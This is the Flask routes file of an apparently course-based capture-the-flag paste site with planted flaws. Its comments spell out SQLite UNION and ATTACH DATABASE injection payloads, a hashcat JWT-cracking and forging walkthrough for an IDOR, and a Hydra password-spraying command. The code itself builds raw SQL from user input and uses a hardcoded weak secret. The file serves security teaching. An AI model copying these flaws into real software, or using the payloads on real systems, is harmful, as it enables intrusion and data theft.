import os
import sqlite3
from flask import Blueprint, render_template, request, redirect, url_for, flash, abort
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from . import db
from .models import User, Paste, Comment, Message
import jwt as pyjwt

main = Blueprint("main", __name__)
auth = Blueprint("auth", __name__)

#Deliberately Weak Secret (can be modified)
JWT_SECRET = "secret123"

def make_token(message_id):
    """Encode a message ID into a signed JWT."""
    return pyjwt.encode({"msg_id": message_id}, JWT_SECRET, algorithm="HS256")

def read_token(token):
    """Decode and verify a JWT, return the message ID inside."""
    payload = pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    return payload["msg_id"]

# ---------------------------------------------------------------------------
# Main routes
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# FLAG 2 — SQL Injection in Search (SQLite UNION + ATTACH DATABASE)
# ---------------------------------------------------------------------------
# HOW IT WORKS:
#   The search query is built by concatenating user input directly into
#   raw SQL without sanitization or parameterization. Additionally, we
#   filter certain characters to increase difficulty:
#   - Spaces (" ") → bypass with %0A (newline) or /**/
#   - Double dashes ("--") → bypass with # for comments
#   - Commas (",") → bypass using UNION and || for concatenation
#
# HOW TO EXPLOIT:
#   Step 1: Test injection with single quote
#     ?q='
#     Result: SQL error (confirms vulnerability)
#
#   Step 2: Balance the query
#     ?q=')union%0Aselect%0A1%0Aunion%0Aselect%0A2%23
#     Result: Returns dummy data (confirms UNION works)
#
#   Step 3: Enumerate tables using sqlite_master
#     ?q=')union%0Aselect%0Agroup_concat(name)%0Afrom%0Asqlite_master%0Awhere%0Atype='table'%23
#     Result: Lists all tables (including 'secrets' table)
#
#   Step 4: Query secrets table for hint
#     ?q=')union%0Aselect%0Avalue%0Afrom%0Asecrets%23
#     Result: "Flag is stored in /app/data/flag.db in table 'vault'"
#
#   Step 5: Attach the flag database
#     ?q=');ATTACH%0ADATABASE%0A'/app/data/flag.db'%0AAS%0Aflagdb%23
#     Result: Mounts the external database
#
#   Step 6: Query the attached database
#     ?q=')union%0Aselect%0Aflag%0Afrom%0Aflagdb.vault%23
#     Result: FLAG{SQLit3_Att4ch_M4st3ry_Un10n_Byp4ss!}
# ---------------------------------------------------------------------------

@main.route("/")
def index():
    query = request.args.get("q", "").strip()
    results = []
    error_message = None
    
    if query:
        # Apply character filters to increase difficulty
        filtered_chars = {
            '--': 'double dashes',
            ',': 'commas'
        }
        
        # Check for filtered characters
        for char, name in filtered_chars.items():
            if char in query:
                flash(f"Character '{char}' is filtered. Try a different approach.", "danger")
                return render_template("index.html", pastes=[], query=query)
        
        # VULNERABLE: Build raw SQL query with user input
        db_path = "/app/data/app.db"
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Intentionally vulnerable query
        raw_query = f"SELECT id, title, body FROM paste WHERE body LIKE '%{query}%'"
        
        try:
            cursor.execute(raw_query)
            rows = cursor.fetchall()
            
            # Convert results to Paste objects for template
            for row in rows:
                paste = Paste.query.get(row[0]) if len(row) >= 1 and isinstance(row[0], int) else None
                if paste:
                    results.append(paste)
                else:
                    # For UNION injection results, create a fake paste to display
                    class FakePaste:
                        def __init__(self, data):
                            self.id = 0
                            self.title = str(data[1]) if len(data) > 1 else "No Title"
                            self.body = str(data[2]) if len(data) > 2 else "No Body"
                            self.language = "text"
                            self.comments = []
                            self.user_id = None
                            self.author = type('obj', (object,), {'username': 'system'})()
                    
                    results.append(FakePaste(row))
        
        except sqlite3.Error as e:
            error_message = f"SQL Error: {str(e)}"
            flash(error_message, "danger")
        finally:
            conn.close()
    else:
        # Normal query when no search term
        results = Paste.query.order_by(Paste.id.desc()).all()
    
    return render_template("index.html", pastes=results, query=query)


@main.route("/pastes/new", methods=["GET", "POST"])
@login_required
def new_paste():
    if request.method == "POST":
        title = request.form.get("title", "")
        body = request.form.get("body", "")
        language = request.form.get("language", "text")
        paste = Paste(title=title, body=body, language=language, user_id=current_user.id)
        db.session.add(paste)
        db.session.commit()
        flash("Paste created.", "success")
        return redirect(url_for("main.index"))
    return render_template("paste_form.html")


@main.route("/pastes/<int:paste_id>/comments", methods=["POST"])
@login_required
def add_comment(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    body = request.form.get("comment", "").strip()
    if not body:
        flash("Comment cannot be empty.", "danger")
        return redirect(url_for("main.index"))
    comment = Comment(body=body, paste_id=paste.id, user_id=current_user.id)
    db.session.add(comment)
    db.session.commit()
    flash("Comment added.", "success")
    return redirect(url_for("main.index"))


@main.route("/pastes/<int:paste_id>/delete", methods=["POST"])
@login_required
def delete_paste(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    db.session.delete(paste)
    db.session.commit()
    flash("Paste deleted.", "info")
    return redirect(url_for("main.index"))


@main.route("/pastes/<int:paste_id>/edit", methods=["GET", "POST"])
@login_required
def edit_paste(paste_id):
    paste = Paste.query.get_or_404(paste_id)

    if request.method == "POST":
        paste.title = request.form.get("title", paste.title).strip()
        paste.body = request.form.get("body", paste.body).strip()
        paste.language = request.form.get("language", paste.language)
        db.session.commit()
        flash("Post updated.", "success")
        return redirect(url_for("main.edit_paste", paste_id=paste_id))

    return render_template(
        "paste_edit.html",
        paste=paste,
    )


# ---------------------------------------------------------------------------
# Auth routes
# ---------------------------------------------------------------------------

@auth.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if User.query.filter_by(username=username).first():
            flash("Username already taken.", "danger")
            return redirect(url_for("auth.register"))
        user = User(
            username=username,
            password_hash=generate_password_hash(password),
        )
        db.session.add(user)
        db.session.commit()
        flash("Registered! Please log in.", "success")
        return redirect(url_for("auth.login"))
    return render_template("register.html")


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Login — safe, no vulnerability here
# ---------------------------------------------------------------------------

@auth.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # Safe login using SQLAlchemy ORM
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            # FLAG 3 — fires immediately when elon logs in via password spraying
            if user.username == "elon":
                flash("Welcome back, elon! ENPM634{3NPM634_Spr1ng_pwn3d!}", "success")
            else:
                flash(f"Welcome back, {user.username}!", "success")
            return redirect(url_for("main.index"))

        flash("Invalid username or password.", "danger")
    return render_template("login.html")


@main.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    if request.method == "POST":
        old_password = request.form.get("old_password", "")
        new_password = request.form.get("new_password", "")
        confirm_password = request.form.get("confirm_password", "")

        if not check_password_hash(current_user.password_hash, old_password):
            flash("Current password is incorrect.", "danger")
            return redirect(url_for("main.profile"))

        if not new_password or new_password != confirm_password:
            flash("New passwords do not match or are empty.", "danger")
            return redirect(url_for("main.profile"))

        if len(new_password) < 8:
            flash("New password must be at least 8 characters long.", "danger")
            return redirect(url_for("main.profile"))

        current_user.password_hash = generate_password_hash(new_password)
        db.session.commit()
        flash("Password updated successfully.", "success")
        return redirect(url_for("main.profile"))

    # ---------------------------------------------------------------------------
    # FLAG 3 — Password Spraying on elon
    # ---------------------------------------------------------------------------
    # HOW TO GET FLAG 3:
    #   1. Read elon's posts and comments carefully
    #   2. Clue 1: He took ENPM634 subject
    #   3. Clue 2: He took that subject in SPRING
    #   4. Build wordlist: ENPM634, Spring, Spring634, ...
    #   6. Hydra spray:
    #      hydra -l elon -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
    #   7. Login as elon with password: ENPM634@Spring
    # ---------------------------------------------------------------------------
    flag3_hint = None
    return render_template("profile.html", flag3_hint=flag3_hint)


@auth.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("main.index"))


# ---------------------------------------------------------------------------
# Messaging — Inbox, Compose, View
# ---------------------------------------------------------------------------

@main.route("/inbox")
@login_required
def inbox():
    messages = Message.query.filter_by(recipient_id=current_user.id).order_by(Message.created_at.desc()).all()
    tokens = {msg.id: make_token(msg.id) for msg in messages}
    return render_template("inbox.html", messages=messages, tokens=tokens) 

# ---------------------------------------------------------------------------
# Compose — lets any logged-in user send a message to any other user.
# The recipient dropdown exposes all usernames (mild info-disclosure),
# which is intentional — it helps players discover admin / elon / joe.
# ---------------------------------------------------------------------------

@main.route("/messages/compose", methods=["GET", "POST"])
@login_required
def compose():
    # All users except the sender populate the dropdown
    users = User.query.filter(User.id != current_user.id).order_by(User.username).all()

    if request.method == "POST":
        recipient_id = request.form.get("recipient_id", type=int)
        subject = request.form.get("subject", "").strip()
        body = request.form.get("body", "").strip()

        if not recipient_id or not subject or not body:
            flash("All fields are required.", "danger")
            return render_template("compose.html", users=users)

        recipient = User.query.get(recipient_id)
        if not recipient:
            flash("Recipient not found.", "danger")
            return render_template("compose.html", users=users)

        msg = Message(
            sender_id=current_user.id,
            recipient_id=recipient.id,
            subject=subject,
            body=body,
        )
        db.session.add(msg)
        db.session.commit()
        flash(f"Message sent to {recipient.username}.", "success")
        return redirect(url_for("main.inbox"))

    return render_template("compose.html", users=users)


# ---------------------------------------------------------------------------
# FLAG 6 — IDOR on private messages (JWT edition)
# ---------------------------------------------------------------------------
# HOW IT WORKS:
#   Each inbox link contains a signed JWT with the message ID inside.
#   The server signs tokens with a weak secret ("secret123").
#   view_message decodes the JWT but never checks ownership — any
#   logged-in user can read any message if they forge a valid token.
#
# HOW TO EXPLOIT:
#   1. Log in as any user -> go to /inbox -> copy the JWT from a link.
#   2. Paste into jwt.io -> decode payload -> see {"msg_id": N}.
#   3. Crack the weak signing secret with hashcat:
#      hashcat -a 0 -m 16500 <token> rockyou.txt  ->  cracks "secret123"
#   4. Go back to jwt.io -> change msg_id to 6 -> re-sign with secret123.
#   5. Visit /messages/<forged_token> -> flag fires.
#
# FLAG lives on message #6 (admin -> creed). Creed is a hidden user —
# discoverable only via the Compose dropdown. The flag is NOT in the
# message body — it only appears via the IDOR banner below.
# ---------------------------------------------------------------------------

@main.route("/messages/<string:token>")
@login_required
def view_message(token):
    # Decode the JWT — invalid or tampered tokens (wrong secret) return 404
    try:
        message_id = read_token(token)
    except Exception:
        abort(404)

    message = Message.query.get_or_404(message_id)
    flag5 = os.environ.get("FLAG_5", "FLAG_5_NOT_SET")
    is_my_message = (message.recipient_id == current_user.id or message.sender_id == current_user.id)
    # Flag only fires on message #3 when accessed by someone who isn't admin or chief
    show_flag = (message_id == 6 and not is_my_message)

    if message.recipient_id == current_user.id and not message.read:
        message.read = True
        db.session.commit()

    return render_template("view_message.html", message=message, flag5=flag5, is_my_message=is_my_message, show_flag=show_flag)